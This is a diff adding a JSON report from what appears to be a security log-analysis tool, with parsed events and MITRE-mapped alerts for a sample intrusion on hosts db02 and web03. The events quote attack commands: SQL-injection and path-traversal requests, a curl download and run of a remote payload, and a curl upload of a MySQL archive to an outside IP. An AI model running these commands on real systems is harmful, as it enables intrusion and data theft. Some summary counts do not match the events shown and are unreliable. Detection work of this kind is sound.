@@ -1,0 +1,742 @@
+{
+  "generated_at": "2026-09-22T05:19:01.342009+00:00",
+  "source": "sample_incident.log",
+  "events": [
+    {
+      "timestamp": "2026-09-09T02:03:11+00:00",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "login",
+      "status": "failed",
+      "line": 1,
+      "host": "db02",
+      "pid": "20011",
+      "raw": "Sep 09 02:03:11 db02 sshd[20011]: Failed password for invalid user backup from 41.202.19.63 port 44210 ssh2"
+    },
+    {
+      "timestamp": "2026-09-09T02:03:14+00:00",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "login",
+      "status": "failed",
+      "line": 2,
+      "host": "db02",
+      "pid": "20012",
+      "raw": "Sep 09 02:03:14 db02 sshd[20012]: Failed password for invalid user backup from 41.202.19.63 port 44218 ssh2"
+    },
+    {
+      "timestamp": "2026-09-09T02:03:18+00:00",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "login",
+      "status": "failed",
+      "line": 3,
+      "host": "db02",
+      "pid": "20013",
+      "raw": "Sep 09 02:03:18 db02 sshd[20013]: Failed password for invalid user backup from 41.202.19.63 port 44226 ssh2"
+    },
+    {
+      "timestamp": "2026-09-09T02:03:22+00:00",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "login",
+      "status": "failed",
+      "line": 4,
+      "host": "db02",
+      "pid": "20014",
+      "raw": "Sep 09 02:03:22 db02 sshd[20014]: Failed password for invalid user backup from 41.202.19.63 port 44234 ssh2"
+    },
+    {
+      "timestamp": "2026-09-09T02:03:29+00:00",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "login",
+      "status": "success",
+      "line": 5,
+      "host": "db02",
+      "pid": "20015",
+      "raw": "Sep 09 02:03:29 db02 sshd[20015]: Accepted password for backup from 41.202.19.63 port 44242 ssh2"
+    },
+    {
+      "timestamp": "2026-09-09T02:03:29+00:00",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "session",
+      "status": "success",
+      "line": 6,
+      "host": "db02",
+      "process": "sshd",
+      "pid": "20015",
+      "message": "pam_unix(sshd:session): session opened for user backup by (uid=0)",
+      "event_type": "ssh_session",
+      "session_state": "opened",
+      "raw": "Sep 09 02:03:29 db02 sshd[20015]: pam_unix(sshd:session): session opened for user backup by (uid=0)",
+      "session_source_ip": "41.202.19.63",
+      "session_pid": "20015"
+    },
+    {
+      "timestamp": "2026-09-09T02:03:31+00:00",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "country": "RO",
+      "action": "country_change",
+      "status": "alert",
+      "line": 7,
+      "host": "db02",
+      "process": "geoip",
+      "pid": null,
+      "message": "login for user backup previously seen from US, now seen from RO (Romania) within 4 minutes",
+      "event_type": "geoip_change",
+      "previous_country": "US",
+      "raw": "Sep 09 02:03:31 db02 geoip: login for user backup previously seen from US, now seen from RO (Romania) within 4 minutes",
+      "session_source_ip": "41.202.19.63",
+      "session_pid": "20015"
+    },
+    {
+      "timestamp": "2026-09-09T02:04:02+00:00",
+      "user": "unknown",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "firewall",
+      "status": "failed",
+      "line": 8,
+      "host": "db02",
+      "process": "kernel",
+      "pid": null,
+      "message": "[UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=21",
+      "event_type": "firewall_block",
+      "destination_ip": "10.0.0.12",
+      "destination_port": 21,
+      "raw": "Sep 09 02:04:02 db02 kernel: [UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=21"
+    },
+    {
+      "timestamp": "2026-09-09T02:04:02+00:00",
+      "user": "unknown",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "firewall",
+      "status": "failed",
+      "line": 9,
+      "host": "db02",
+      "process": "kernel",
+      "pid": null,
+      "message": "[UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=22",
+      "event_type": "firewall_block",
+      "destination_ip": "10.0.0.12",
+      "destination_port": 22,
+      "raw": "Sep 09 02:04:02 db02 kernel: [UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=22"
+    },
+    {
+      "timestamp": "2026-09-09T02:04:02+00:00",
+      "user": "unknown",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "firewall",
+      "status": "failed",
+      "line": 10,
+      "host": "db02",
+      "process": "kernel",
+      "pid": null,
+      "message": "[UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=23",
+      "event_type": "firewall_block",
+      "destination_ip": "10.0.0.12",
+      "destination_port": 23,
+      "raw": "Sep 09 02:04:02 db02 kernel: [UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=23"
+    },
+    {
+      "timestamp": "2026-09-09T02:04:03+00:00",
+      "user": "unknown",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "firewall",
+      "status": "failed",
+      "line": 11,
+      "host": "db02",
+      "process": "kernel",
+      "pid": null,
+      "message": "[UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=25",
+      "event_type": "firewall_block",
+      "destination_ip": "10.0.0.12",
+      "destination_port": 25,
+      "raw": "Sep 09 02:04:03 db02 kernel: [UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=25"
+    },
+    {
+      "timestamp": "2026-09-09T02:04:03+00:00",
+      "user": "unknown",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "firewall",
+      "status": "failed",
+      "line": 12,
+      "host": "db02",
+      "process": "kernel",
+      "pid": null,
+      "message": "[UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=3306",
+      "event_type": "firewall_block",
+      "destination_ip": "10.0.0.12",
+      "destination_port": 3306,
+      "raw": "Sep 09 02:04:03 db02 kernel: [UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=3306"
+    },
+    {
+      "timestamp": "2026-09-09T02:04:03+00:00",
+      "user": "unknown",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "firewall",
+      "status": "failed",
+      "line": 13,
+      "host": "db02",
+      "process": "kernel",
+      "pid": null,
+      "message": "[UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=8080",
+      "event_type": "firewall_block",
+      "destination_ip": "10.0.0.12",
+      "destination_port": 8080,
+      "raw": "Sep 09 02:04:03 db02 kernel: [UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=8080"
+    },
+    {
+      "timestamp": "2026-09-09T02:04:03+00:00",
+      "user": "unknown",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "firewall",
+      "status": "failed",
+      "line": 14,
+      "host": "db02",
+      "process": "kernel",
+      "pid": null,
+      "message": "[UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=8443",
+      "event_type": "firewall_block",
+      "destination_ip": "10.0.0.12",
+      "destination_port": 8443,
+      "raw": "Sep 09 02:04:03 db02 kernel: [UFW BLOCK] IN=eth0 SRC=41.202.19.63 DST=10.0.0.12 PROTO=TCP DPT=8443"
+    },
+    {
+      "timestamp": "2026-09-09T02:05:10+00:00",
+      "user": "unknown",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "GET",
+      "status": "success",
+      "line": 15,
+      "host": "web03",
+      "process": "nginx",
+      "pid": null,
+      "message": "41.202.19.63 - - [09/Sep/2026:02:05:10 +0000] \"GET /login.php?id=1' OR '1'='1 HTTP/1.1\" 200 512",
+      "event_type": "web_access",
+      "request": "GET /login.php?id=1' OR '1'='1 HTTP/1.1",
+      "raw": "Sep 09 02:05:10 web03 nginx: 41.202.19.63 - - [09/Sep/2026:02:05:10 +0000] \"GET /login.php?id=1' OR '1'='1 HTTP/1.1\" 200 512"
+    },
+    {
+      "timestamp": "2026-09-09T02:05:12+00:00",
+      "user": "unknown",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "GET",
+      "status": "success",
+      "line": 16,
+      "host": "web03",
+      "process": "nginx",
+      "pid": null,
+      "message": "41.202.19.63 - - [09/Sep/2026:02:05:12 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 404 220",
+      "event_type": "web_access",
+      "request": "GET /../../../../etc/passwd HTTP/1.1",
+      "raw": "Sep 09 02:05:12 web03 nginx: 41.202.19.63 - - [09/Sep/2026:02:05:12 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 404 220"
+    },
+    {
+      "timestamp": "2026-09-09T02:05:15+00:00",
+      "user": "unknown",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "POST",
+      "status": "success",
+      "line": 17,
+      "host": "web03",
+      "process": "nginx",
+      "pid": null,
+      "message": "41.202.19.63 - - [09/Sep/2026:02:05:15 +0000] \"POST /upload.php HTTP/1.1\" 200 88",
+      "event_type": "web_access",
+      "request": "POST /upload.php HTTP/1.1",
+      "raw": "Sep 09 02:05:15 web03 nginx: 41.202.19.63 - - [09/Sep/2026:02:05:15 +0000] \"POST /upload.php HTTP/1.1\" 200 88"
+    },
+    {
+      "timestamp": "2026-09-09T02:06:00+00:00",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "privilege",
+      "status": "alert",
+      "line": 18,
+      "host": "db02",
+      "pid": null,
+      "tty": "pts/1",
+      "pwd": "/home/backup",
+      "command": "/usr/bin/curl -s http://185.44.77.12/payload.sh -o /tmp/.sysupd",
+      "target_user": "root",
+      "raw": "Sep 09 02:06:00 db02 sudo: backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/curl -s http://185.44.77.12/payload.sh -o /tmp/.sysupd",
+      "session_source_ip": "41.202.19.63",
+      "session_pid": "20015"
+    },
+    {
+      "timestamp": "2026-09-09T02:06:02+00:00",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "privilege",
+      "status": "alert",
+      "line": 19,
+      "host": "db02",
+      "pid": null,
+      "tty": "pts/1",
+      "pwd": "/home/backup",
+      "command": "/bin/chmod +x /tmp/.sysupd",
+      "target_user": "root",
+      "raw": "Sep 09 02:06:02 db02 sudo: backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/chmod +x /tmp/.sysupd",
+      "session_source_ip": "41.202.19.63",
+      "session_pid": "20015"
+    },
+    {
+      "timestamp": "2026-09-09T02:06:03+00:00",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "privilege",
+      "status": "alert",
+      "line": 20,
+      "host": "db02",
+      "pid": null,
+      "tty": "pts/1",
+      "pwd": "/home/backup",
+      "command": "/tmp/.sysupd",
+      "target_user": "root",
+      "raw": "Sep 09 02:06:03 db02 sudo: backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/tmp/.sysupd",
+      "session_source_ip": "41.202.19.63",
+      "session_pid": "20015"
+    },
+    {
+      "timestamp": "2026-09-09T02:10:03+00:00",
+      "user": "unknown",
+      "ip": "185.44.77.12",
+      "country": "UNKNOWN",
+      "action": "c2",
+      "status": "alert",
+      "line": 21,
+      "host": "db02",
+      "process": "sysupd",
+      "pid": null,
+      "message": "beacon check-in to 185.44.77.12:443",
+      "event_type": "beacon",
+      "destination_port": 443,
+      "raw": "Sep 09 02:10:03 db02 sysupd: beacon check-in to 185.44.77.12:443"
+    },
+    {
+      "timestamp": "2026-09-09T02:15:03+00:00",
+      "user": "unknown",
+      "ip": "185.44.77.12",
+      "country": "UNKNOWN",
+      "action": "c2",
+      "status": "alert",
+      "line": 22,
+      "host": "db02",
+      "process": "sysupd",
+      "pid": null,
+      "message": "beacon check-in to 185.44.77.12:443",
+      "event_type": "beacon",
+      "destination_port": 443,
+      "raw": "Sep 09 02:15:03 db02 sysupd: beacon check-in to 185.44.77.12:443"
+    },
+    {
+      "timestamp": "2026-09-09T02:20:04+00:00",
+      "user": "unknown",
+      "ip": "185.44.77.12",
+      "country": "UNKNOWN",
+      "action": "c2",
+      "status": "alert",
+      "line": 23,
+      "host": "db02",
+      "process": "sysupd",
+      "pid": null,
+      "message": "beacon check-in to 185.44.77.12:443",
+      "event_type": "beacon",
+      "destination_port": 443,
+      "raw": "Sep 09 02:20:04 db02 sysupd: beacon check-in to 185.44.77.12:443"
+    },
+    {
+      "timestamp": "2026-09-09T02:25:03+00:00",
+      "user": "unknown",
+      "ip": "185.44.77.12",
+      "country": "UNKNOWN",
+      "action": "c2",
+      "status": "alert",
+      "line": 24,
+      "host": "db02",
+      "process": "sysupd",
+      "pid": null,
+      "message": "beacon check-in to 185.44.77.12:443",
+      "event_type": "beacon",
+      "destination_port": 443,
+      "raw": "Sep 09 02:25:03 db02 sysupd: beacon check-in to 185.44.77.12:443"
+    },
+    {
+      "timestamp": "2026-09-09T02:31:47+00:00",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "privilege",
+      "status": "alert",
+      "line": 25,
+      "host": "db02",
+      "pid": null,
+      "tty": "pts/1",
+      "pwd": "/var/backups",
+      "command": "/usr/bin/tar -czf /tmp/db_dump.tar.gz /var/lib/mysql",
+      "target_user": "root",
+      "raw": "Sep 09 02:31:47 db02 sudo: backup : TTY=pts/1 ; PWD=/var/backups ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/db_dump.tar.gz /var/lib/mysql",
+      "session_source_ip": "41.202.19.63",
+      "session_pid": "20015"
+    },
+    {
+      "timestamp": "2026-09-09T02:32:10+00:00",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "privilege",
+      "status": "alert",
+      "line": 26,
+      "host": "db02",
+      "pid": null,
+      "tty": "pts/1",
+      "pwd": "/var/backups",
+      "command": "/usr/bin/curl -T /tmp/db_dump.tar.gz ftp://185.44.77.12/upload",
+      "target_user": "root",
+      "raw": "Sep 09 02:32:10 db02 sudo: backup : TTY=pts/1 ; PWD=/var/backups ; USER=root ; COMMAND=/usr/bin/curl -T /tmp/db_dump.tar.gz ftp://185.44.77.12/upload",
+      "session_source_ip": "41.202.19.63",
+      "session_pid": "20015"
+    },
+    {
+      "timestamp": "2026-09-09T02:32:40+00:00",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "country": "UNKNOWN",
+      "action": "session",
+      "status": "info",
+      "line": 27,
+      "host": "db02",
+      "process": "sshd",
+      "pid": "20015",
+      "message": "pam_unix(sshd:session): session closed for user backup",
+      "event_type": "ssh_session",
+      "session_state": "closed",
+      "raw": "Sep 09 02:32:40 db02 sshd[20015]: pam_unix(sshd:session): session closed for user backup",
+      "session_source_ip": "41.202.19.63",
+      "session_pid": "20015",
+      "session_duration_seconds": 1751
+    }
+  ],
+  "alerts": [
+    {
+      "id": "ALT-0004",
+      "created_at": "2026-09-22T05:19:01.341992+00:00",
+      "status": "in_progress",
+      "type": "brute_force",
+      "severity": "critical",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "timestamp": "2026-09-09T02:03:18+00:00",
+      "line": 3,
+      "message": "3 failed login attempts within 10 minutes",
+      "confidence": "high",
+      "mitre": {
+        "technique_id": "T1110",
+        "technique": "Brute Force",
+        "tactic": "Credential Access"
+      },
+      "correlation": {
+        "incident_id": "INC-backup-0003",
+        "related_detection_types": [
+          "account_takeover",
+          "brute_force",
+          "country_change",
+          "data_exfiltration",
+          "post_auth_download_execute"
+        ],
+        "window_minutes": 30
+      },
+      "triage_updated_at": "2026-09-22T05:19:01.361051+00:00"
+    },
+    {
+      "id": "ALT-0005",
+      "created_at": "2026-09-22T05:19:01.341993+00:00",
+      "status": "open",
+      "type": "brute_force_escalated",
+      "severity": "critical",
+      "user": "unknown",
+      "ip": "41.202.19.63",
+      "timestamp": "2026-09-09T02:04:02+00:00",
+      "line": 9,
+      "message": "6 failed login attempts reached at least 2x the threshold of 3",
+      "confidence": "high",
+      "mitre": {
+        "technique_id": "T1110",
+        "technique": "Brute Force",
+        "tactic": "Credential Access"
+      },
+      "correlation": {
+        "incident_id": "INC-41.202.19.63-0009",
+        "related_detection_types": [
+          "brute_force_escalated",
+          "network_scan",
+          "web_attack"
+        ],
+        "window_minutes": 30
+      }
+    },
+    {
+      "id": "ALT-0006",
+      "created_at": "2026-09-22T05:19:01.341995+00:00",
+      "status": "open",
+      "type": "account_takeover",
+      "severity": "critical",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "timestamp": "2026-09-09T02:03:29+00:00",
+      "line": 5,
+      "message": "Successful authentication followed 4 failed attempts from 41.202.19.63 for backup",
+      "confidence": "high",
+      "mitre": {
+        "technique_id": "T1110",
+        "technique": "Brute Force",
+        "tactic": "Credential Access"
+      },
+      "correlation": {
+        "incident_id": "INC-backup-0003",
+        "related_detection_types": [
+          "account_takeover",
+          "brute_force",
+          "country_change",
+          "data_exfiltration",
+          "post_auth_download_execute"
+        ],
+        "window_minutes": 30
+      }
+    },
+    {
+      "id": "ALT-0007",
+      "created_at": "2026-09-22T05:19:01.341996+00:00",
+      "status": "open",
+      "type": "post_auth_download_execute",
+      "severity": "critical",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "timestamp": "2026-09-09T02:06:03+00:00",
+      "line": 20,
+      "message": "Suspicious post-auth download, chmod, and execution chain",
+      "confidence": "high",
+      "mitre": {
+        "technique_id": "T1105",
+        "technique": "Ingress Tool Transfer",
+        "tactic": "Command and Control"
+      },
+      "mitre_techniques": [
+        {
+          "technique_id": "T1105",
+          "technique": "Ingress Tool Transfer"
+        },
+        {
+          "technique_id": "T1204",
+          "technique": "User Execution"
+        }
+      ],
+      "correlation": {
+        "incident_id": "INC-backup-0003",
+        "related_detection_types": [
+          "account_takeover",
+          "brute_force",
+          "country_change",
+          "data_exfiltration",
+          "post_auth_download_execute"
+        ],
+        "window_minutes": 30
+      }
+    },
+    {
+      "id": "ALT-0001",
+      "created_at": "2026-09-22T05:19:01.341985+00:00",
+      "status": "open",
+      "type": "country_change",
+      "severity": "high",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "timestamp": "2026-09-09T02:03:31+00:00",
+      "line": 7,
+      "message": "GeoIP changed from US to RO for backup",
+      "confidence": "high",
+      "mitre": {
+        "technique_id": "T1078",
+        "technique": "Valid Accounts",
+        "tactic": "Initial Access"
+      },
+      "correlation": {
+        "incident_id": "INC-backup-0003",
+        "related_detection_types": [
+          "account_takeover",
+          "brute_force",
+          "country_change",
+          "data_exfiltration",
+          "post_auth_download_execute"
+        ],
+        "window_minutes": 30
+      }
+    },
+    {
+      "id": "ALT-0002",
+      "created_at": "2026-09-22T05:19:01.341989+00:00",
+      "status": "open",
+      "type": "web_attack",
+      "severity": "high",
+      "user": "unknown",
+      "ip": "41.202.19.63",
+      "timestamp": "2026-09-09T02:05:10+00:00",
+      "line": 15,
+      "message": "Web attack payload detected in request content",
+      "confidence": "high",
+      "mitre": {
+        "technique_id": "T1190",
+        "technique": "Exploit Public-Facing Application",
+        "tactic": "Initial Access"
+      },
+      "correlation": {
+        "incident_id": "INC-41.202.19.63-0009",
+        "related_detection_types": [
+          "brute_force_escalated",
+          "network_scan",
+          "web_attack"
+        ],
+        "window_minutes": 30
+      }
+    },
+    {
+      "id": "ALT-0003",
+      "created_at": "2026-09-22T05:19:01.341990+00:00",
+      "status": "open",
+      "type": "web_attack",
+      "severity": "high",
+      "user": "unknown",
+      "ip": "41.202.19.63",
+      "timestamp": "2026-09-09T02:05:12+00:00",
+      "line": 16,
+      "message": "Web attack payload detected in request content",
+      "confidence": "high",
+      "mitre": {
+        "technique_id": "T1190",
+        "technique": "Exploit Public-Facing Application",
+        "tactic": "Initial Access"
+      },
+      "correlation": {
+        "incident_id": "INC-41.202.19.63-0009",
+        "related_detection_types": [
+          "brute_force_escalated",
+          "network_scan",
+          "web_attack"
+        ],
+        "window_minutes": 30
+      }
+    },
+    {
+      "id": "ALT-0008",
+      "created_at": "2026-09-22T05:19:01.341997+00:00",
+      "status": "open",
+      "type": "data_exfiltration",
+      "severity": "high",
+      "user": "backup",
+      "ip": "41.202.19.63",
+      "timestamp": "2026-09-09T02:32:10+00:00",
+      "line": 26,
+      "message": "Archive operation followed by outbound transfer to a suspicious external endpoint",
+      "confidence": "high",
+      "mitre": {
+        "technique_id": "T1041",
+        "technique": "Exfiltration Over C2 Channel",
+        "tactic": "Exfiltration"
+      },
+      "correlation": {
+        "incident_id": "INC-backup-0003",
+        "related_detection_types": [
+          "account_takeover",
+          "brute_force",
+          "country_change",
+          "data_exfiltration",
+          "post_auth_download_execute"
+        ],
+        "window_minutes": 30
+      }
+    },
+    {
+      "id": "ALT-0009",
+      "created_at": "2026-09-22T05:19:01.341999+00:00",
+      "status": "open",
+      "type": "network_scan",
+      "severity": "medium",
+      "user": "unknown",
+      "ip": "41.202.19.63",
+      "timestamp": "2026-09-09T02:04:03+00:00",
+      "line": 11,
+      "message": "4 destination ports scanned on 10.0.0.12 from 41.202.19.63",
+      "confidence": "high",
+      "mitre": {
+        "technique_id": "T1046",
+        "technique": "Network Service Scanning",
+        "tactic": "Discovery"
+      },
+      "correlation": {
+        "incident_id": "INC-41.202.19.63-0009",
+        "related_detection_types": [
+          "brute_force_escalated",
+          "network_scan",
+          "web_attack"
+        ],
+        "window_minutes": 30
+      }
+    },
+    {
+      "id": "ALT-0010",
+      "created_at": "2026-09-22T05:19:01.342000+00:00",
+      "status": "open",
+      "type": "c2_beaconing",
+      "severity": "medium",
+      "user": "unknown",
+      "ip": "185.44.77.12",
+      "timestamp": "2026-09-09T02:20:04+00:00",
+      "line": 23,
+      "message": "Periodic outbound beaconing to 185.44.77.12:443",
+      "confidence": "high",
+      "mitre": {
+        "technique_id": "T1071",
+        "technique": "Application Layer Protocol",
+        "tactic": "Command and Control"
+      }
+    }
+  ],
+  "parse_errors": [],
+  "risk_score": 100,
+  "summary": {
+    "total_events": 27,
+    "failed_logins": 11,
+    "successful_logins": 5,
+    "open_alerts": 10,
+    "severity_counts": {
+      "critical": 4,
+      "high": 4,
+      "medium": 2,
+      "low": 0
+    },
+    "unique_users": 2,
+    "unique_ips": 2
+  }
+}
